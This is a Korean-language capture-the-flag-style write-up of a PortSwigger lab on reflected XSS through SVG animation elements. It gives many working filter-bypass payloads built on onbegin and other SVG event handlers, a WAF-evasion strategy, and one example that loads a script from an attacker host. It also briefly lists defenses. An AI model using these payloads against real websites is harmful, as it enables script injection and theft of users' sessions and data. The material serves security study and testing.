# Lab: Reflected XSS with some SVG markup allowed

## 개요

- **난이도**: Practitioner
- **주제**: Cross-Site Scripting (XSS) — Reflected / SVG 애니메이션 / `onbegin` 이벤트
- **링크**: https://portswigger.net/web-security/cross-site-scripting/contexts/lab-some-svg-markup-allowed

## 목표

일부 SVG 태그만 허용된 환경에서 `<animateTransform>` 과 `onbegin` 이벤트를 이용해 `alert()` 를 실행시킨다.

## 취약점 분석

WAF가 대부분의 HTML 태그를 차단하지만 일부 SVG 태그는 허용한다.

```
<script>          → 차단
<img>             → 차단
<svg>             → 허용
<animateTransform>→ 허용
<animate>         → 허용
<set>             → 허용
onload            → 차단
onbegin           → 허용!
```

## 공격 방법

```html
<svg><animateTransform onbegin=alert(1) attributeName=transform>
```

- `<svg>` — SVG 컨텍스트 시작
- `<animateTransform>` — SVG 변환 애니메이션 요소
- `onbegin=alert(1)` — 애니메이션이 시작되는 순간 실행
- `attributeName=transform` — 유효한 SVG 속성 (animateTransform 필수 속성)

페이지 로드 시 `<animateTransform>` 이 즉시 실행을 시작하므로 사용자 상호작용 없이 `alert()` 가 발생한다.

---

## SVG 애니메이션 요소 완전 정리

SVG는 SMIL(Synchronized Multimedia Integration Language) 기반의 자체 애니메이션 시스템을 내장한다.  
CSS 애니메이션과 별개로 동작하며, XSS에서 `onbegin` 이벤트를 활용한다.

### `<animate>` — 단일 속성 애니메이션

임의의 SVG 속성 값을 시간에 따라 변경한다.

```html
<!-- x 위치를 0 → 100 으로 이동 -->
<svg>
  <circle cx="0" cy="50" r="10">
    <animate attributeName="cx" from="0" to="100" dur="2s"/>
  </circle>
</svg>

<!-- XSS: 즉시 시작되는 animate의 onbegin 활용 -->
<svg><animate onbegin=alert(1) attributeName=x>
```

| 속성 | 설명 | 예시 |
|------|------|------|
| `attributeName` | 애니메이션할 속성 이름 | `cx`, `opacity`, `fill` |
| `from` | 시작 값 | `0` |
| `to` | 종료 값 | `100` |
| `dur` | 지속 시간 | `2s`, `500ms`, `indefinite` |
| `repeatCount` | 반복 횟수 | `1`, `indefinite` |
| `begin` | 시작 조건 | `0s`, `click`, `mouseover` |
| `fill` | 종료 후 상태 | `freeze`(유지), `remove`(초기화) |

### `<animateTransform>` — 변환 애니메이션

SVG 요소의 기하학적 변환(이동, 회전, 크기, 기울기)을 애니메이션한다.

```html
<!-- 회전 애니메이션 -->
<svg>
  <rect width="50" height="50">
    <animateTransform attributeName="transform"
                      type="rotate"
                      from="0 25 25" to="360 25 25"
                      dur="2s" repeatCount="indefinite"/>
  </rect>
</svg>

<!-- XSS -->
<svg><animateTransform onbegin=alert(1) attributeName=transform>
```

| `type` 값 | 변환 종류 | `from`/`to` 형식 |
|-----------|----------|-----------------|
| `translate` | 이동 | `"x y"` |
| `rotate` | 회전 | `"angle cx cy"` |
| `scale` | 크기 | `"sx sy"` |
| `skewX` | X축 기울기 | `"angle"` |
| `skewY` | Y축 기울기 | `"angle"` |

### `<animateMotion>` — 경로 따라 이동

요소를 SVG 경로(path)를 따라 이동시킨다.

```html
<svg>
  <circle r="5">
    <animateMotion dur="3s" repeatCount="indefinite"
                   path="M0,0 C50,100 100,0 150,100"/>
  </circle>
</svg>

<!-- XSS -->
<svg><animateMotion onbegin=alert(1) dur="0.1s">
```

### `<set>` — 속성 값 즉시 설정

애니메이션 없이 특정 시점에 속성 값을 변경한다.

```html
<!-- 2초 후 원의 색을 빨간색으로 변경 -->
<svg>
  <circle cx="50" cy="50" r="30" fill="blue">
    <set attributeName="fill" to="red" begin="2s"/>
  </circle>
</svg>

<!-- XSS: begin="0" 으로 즉시 실행 -->
<svg><set onbegin=alert(1) attributeName=x begin="0">
```

### `<discard>` — 요소 제거

지정된 시간 후 요소를 DOM에서 제거한다. (SVG 2.0)

```html
<svg>
  <circle cx="50" cy="50" r="30">
    <discard begin="3s"/>  <!-- 3초 후 circle 제거 -->
  </circle>
</svg>
```

---

## SVG 이벤트 완전 정리

### SMIL 애니메이션 이벤트 — 자동 실행 (핵심)

SVG 애니메이션 요소에서 발화하는 이벤트. **페이지 로드 즉시 자동 실행**된다.

| 이벤트 | 발화 시점 | 사용 요소 | XSS 페이로드 |
|--------|-----------|-----------|-------------|
| `onbegin` | 애니메이션 시작 시 | `<animate>`, `<animateTransform>`, `<animateMotion>`, `<set>` | `<svg><animate onbegin=alert(1) attributeName=x>` |
| `onend` | 애니메이션 종료 시 | 동일 | `<svg><animate onend=alert(1) attributeName=x dur="0.01s">` |
| `onrepeat` | 애니메이션 반복 시 | 동일 | `<svg><animate onrepeat=alert(1) attributeName=x repeatCount="indefinite">` |

**`onbegin` 이 가장 강력한 이유**: `dur` 없이도 즉시 시작되고, 애니메이션이 유효한지 여부와 관계없이 이벤트가 발화한다.

### SVG 문서/로드 이벤트

| 이벤트 | 발화 시점 | 예시 |
|--------|-----------|------|
| `onload` | SVG 문서 로드 완료 | `<svg onload=alert(1)>` |
| `onunload` | SVG 문서 언로드 | `<svg onunload=alert(1)>` |
| `onabort` | 로드 중단 시 | `<image onabort=alert(1)>` |
| `onerror` | 로드 오류 시 | `<image onerror=alert(1) href=x>` |
| `onresize` | SVG 크기 변경 시 | `<svg onresize=alert(1)>` |
| `onscroll` | SVG 뷰포트 스크롤 시 | `<svg onscroll=alert(1)>` |
| `onzoom` | SVG 뷰포트 확대/축소 시 | `<svg onzoom=alert(1)>` (SVG 고유) |

### SVG 마우스 이벤트

```html
<svg onmouseover=alert(1)>hover</svg>
<svg onclick=alert(1)>클릭</svg>
<svg onmousedown=alert(1)>누르기</svg>
<svg onmouseup=alert(1)>놓기</svg>
<svg onmousemove=alert(1)>이동</svg>
<svg onmouseout=alert(1)>이탈</svg>
<svg onmouseenter=alert(1)>진입</svg>
<svg onmouseleave=alert(1)>이탈</svg>
```

### SVG 포커스 이벤트

```html
<svg onfocus=alert(1) tabindex=1>포커스</svg>
<svg onfocusin=alert(1)>포커스 진입</svg>
<svg onfocusout=alert(1)>포커스 이탈</svg>
<svg onblur=alert(1) tabindex=1>블러</svg>
```

### SVG 키보드 이벤트

```html
<svg onkeydown=alert(1) tabindex=1>키 누르기</svg>
<svg onkeyup=alert(1) tabindex=1>키 놓기</svg>
<svg onkeypress=alert(1) tabindex=1>키 입력</svg>
```

### SVG 고유 이벤트 (HTML에 없는 것)

| 이벤트 | 발화 시점 | 특이사항 |
|--------|-----------|---------|
| `onzoom` | SVG 뷰포트 zoom 변경 시 | SVG 전용 |
| `onactivate` | 요소 활성화 시 (클릭/키) | SVG 인터랙션 스펙 |
| `onbegin` | 애니메이션 시작 | SMIL 전용 |
| `onend` | 애니메이션 종료 | SMIL 전용 |
| `onrepeat` | 애니메이션 반복 | SMIL 전용 |

---

## SVG 내부에서 `<script>` 실행

SVG는 자체적으로 `<script>` 태그를 지원한다. WAF가 SVG를 허용하면서 내부 `<script>` 를 체크하지 않으면 직접 JS 실행이 가능하다.

```html
<svg>
  <script>alert(1)</script>
</svg>

<!-- 또는 외부 스크립트 로드 -->
<svg>
  <script href="https://attacker.com/xss.js" />
</svg>
```

---

## SVG XSS 페이로드 실행 조건별 요약

| 실행 조건 | 페이로드 |
|-----------|---------|
| 페이지 로드 즉시 | `<svg><animate onbegin=alert(1) attributeName=x>` |
| 페이지 로드 즉시 | `<svg onload=alert(1)>` |
| 페이지 로드 즉시 | `<svg><animateTransform onbegin=alert(1) attributeName=transform>` |
| 애니메이션 완료 후 | `<svg><animate onend=alert(1) attributeName=x dur="0.01s">` |
| 마우스 오버 시 | `<svg onmouseover=alert(1)>x</svg>` |
| 클릭 시 | `<svg onclick=alert(1)>클릭</svg>` |
| 포커스 시 | `<svg onfocus=alert(1) tabindex=1>` + URL `#id` |
| 이미지 로드 실패 | `<svg><image onerror=alert(1) href=x>` |

---

## 핵심 정리

- SVG는 SMIL 기반 자체 애니메이션 시스템을 가지며, `onbegin`/`onend`/`onrepeat` 이벤트가 자동 발화한다.
- `<animate>`, `<animateTransform>`, `<animateMotion>`, `<set>` 모두 `onbegin` 을 지원한다.
- WAF가 `onload` 를 차단해도 `onbegin` 은 허용하는 경우가 있어 우회 수단이 된다.
- SVG 내부에서도 `<script>` 가 동작하므로, SVG 자체를 허용하면서 내부 콘텐츠를 검사하지 않으면 취약하다.
- **방어**: SVG 허용 시 내부 태그/속성도 화이트리스트로 제한, `<script>` 및 이벤트 핸들러 속성 제거, DOMPurify 사용.

## 배운 점 및 추가 학습

### 1. `onbegin` 이 자동 실행되는 이유

SMIL 애니메이션은 기본 `begin` 값이 `"0"` (문서 로드 즉시)이다.

```html
<!-- begin 속성 없음 → 기본값 0s → 로드 즉시 시작 → onbegin 발화 -->
<svg><animate onbegin=alert(1) attributeName=x>

<!-- 명시적으로 지연 가능 -->
<svg><animate onbegin=alert(1) attributeName=x begin="2s">
<!-- 2초 후 onbegin 발화 -->
```

### 2. `begin` 속성의 이벤트 연동

`begin` 속성에 이벤트를 지정하면 해당 이벤트가 발생할 때 애니메이션을 시작할 수 있다.

```html
<!-- 클릭 시 애니메이션 시작 → onbegin 발화 -->
<svg>
  <rect id="r" width="50" height="50">
    <animate id="anim" attributeName="x" begin="r.click" to="100" dur="1s"
             onbegin=alert(1)/>
  </rect>
</svg>

<!-- 다른 애니메이션 종료 후 시작 -->
<svg>
  <animate id="a1" attributeName=x dur="1s"/>
  <animate attributeName=y begin="a1.end" onbegin=alert(1)/>
</svg>
```

### 3. WAF 우회 수준별 XSS 전략 정리 (014~016)

```
014: 대부분 차단 → 허용된 표준 태그 탐색 (<body onresize>)
015: 표준 태그 전부 차단 → 커스텀 태그 (<xss onfocus>)
016: SVG 일부 허용 → SVG 내부 SMIL 이벤트 (<animate onbegin>)

공통 원칙:
  WAF 블랙리스트는 항상 빈틈이 있다.
  덜 알려진 태그·이벤트 조합이 우회 수단이 된다.
  Burp Intruder + XSS Cheat Sheet로 체계적으로 탐색한다.
```

### 4. SVG SMIL vs CSS 애니메이션

| 항목 | SMIL (`<animate>`) | CSS (`@keyframes`) |
|------|-------------------|-------------------|
| 정의 위치 | SVG 태그 내부 | CSS/`<style>` |
| 이벤트 | `onbegin`, `onend`, `onrepeat` | `onanimationstart`, `onanimationend` |
| XSS 활용 | `onbegin` 자동 발화 | CSS 환경 필요 |
| 브라우저 지원 | 크롬/파이어폭스 O, IE X | 모든 현대 브라우저 |
| WAF 탐지 | 덜 알려져 통과 가능성 높음 | 어느 정도 알려짐 |
